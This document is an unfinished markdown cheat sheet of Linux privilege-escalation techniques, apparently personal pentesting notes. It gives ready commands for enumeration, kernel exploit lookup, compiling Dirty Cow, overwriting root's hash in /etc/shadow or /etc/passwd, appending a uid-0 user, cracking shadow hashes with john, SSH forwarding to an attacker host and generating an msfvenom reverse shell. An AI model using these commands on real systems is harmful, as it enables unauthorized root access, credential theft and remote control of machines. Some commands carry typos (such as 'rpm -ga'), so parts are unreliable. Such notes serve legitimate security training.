# Work in Progress

## automated scripts

linux smart enumeration: https://github.com/diego-treitos/linux-smart-enumeration
```
# print everything the script can gather and do not prompt for a password
./lse.sh -l 2 -i
```

Linenum - https://github.com/rebootuser/LinEnum
```
# export files to a directory and do thorough tests
./linenum.sh -t -e linenum
```

linpeas
linux exploit suggester

linux priv checker - https://github.com/linted/linuxprivchecker

beroot - https://github.com/AlessandroZ/BeRoot

unix -priv-checker - http://pentestmonkey.net/tools/audit/unix-privesc-check

## Survey

Kernel Version
```
uname -a

```
#### Networking 

Port Forwarding to your attacker station:
```
ssh -R <ATTACKER_PORT>:127.0.0.1:<SERVICE_PORT> <USERNAME>@<ATTACKER_IP>
```

## Techniques 

### Kernel Exploits 


Kernel Version
```
uname -a

```
Use the kernel version to find exploits
```
searchsploit linux kernel <VERSION_NUMBER> priv esc
```

Best to use linux-exploit-suggester-2 to get a more refined list:
```
perl linux-exploit-suggester-2.pl -k <VERSION_NUMBER>
```

#### Common exploit 

Dirty Cow complie:
```
gcc -pthread cow.c -o cow
```

### Service Exploits 

Services are programs that run in the background.  Exploiting a service running as root provides command execution as root 

show all processes running as root
```
ps aux | grep "^root"
```
 Obtain the version of the identified programs:
 ```
 <PROGRAM> --version
 <PROGRAM> -v
 
 # debian
 dpkg -l | grep <PROGRAM>
 
 # rpm systems
 rpm -ga | grep <PROGRAM>
 ```

Use searchsploit to find exploits for these programs.

### weak file permissions 

World Readable - means it can read by anyone 
world writeable - anyone can write to the file 

if etc/shadow is readable we can add a user to it

make the massword with the correct hash:
```
mkpasswd -m sha-512 <PASSWORD>
```
now replace the root users password hash with the one that you made.  now you can su to root!

if etc/passwd is readable we can add a user to it

The /etc/passwd historically contained user password hashes.
For backwards compatibility, if the second field of a user row in /etc/passwd
contains a password hash, it takes precedent over the hash in /etc/shadow.
If we can write to /etc/passwd, we can easily enter a known password hash for
the root user, and then use the su command to switch to the root user.

generate a password hash to be placed in the etc/passwd:
```
openssl passwd "password"
```
now add the password hash to the second filed in the etc/passwd file in place if the X for the root user


Alternatively, if we can only append to the file, we can create a new user but
assign them the root user ID (0). This works because Linux allows multiple entries
for the same user ID, as long as the usernames are different.

```
echo "<USERNAME>:L9yLGxncbOROc:0:0:root:/root:/bin/bash" >> /etc/passwd
```


the x in the secod row means to look in the /etc/shadow file
- can delete the x which linux may interpret as there being no password


### Cracking passwords 

if the /etc/shadow file is readable 


root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
- password hash has his between the first and second colon (only copy that to a txt file for cracking)
- $6$ = SHA512
- 

Crack the hash using john
```
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Reverse Shells 
```
msfvenom -p linux/x86/reverse_shell_tcp lhost= lport= -f elf -o rev_shell.elf
```

Native reverse shells:

reverse shell generator: https://github.com/mthbernardes/rsg 



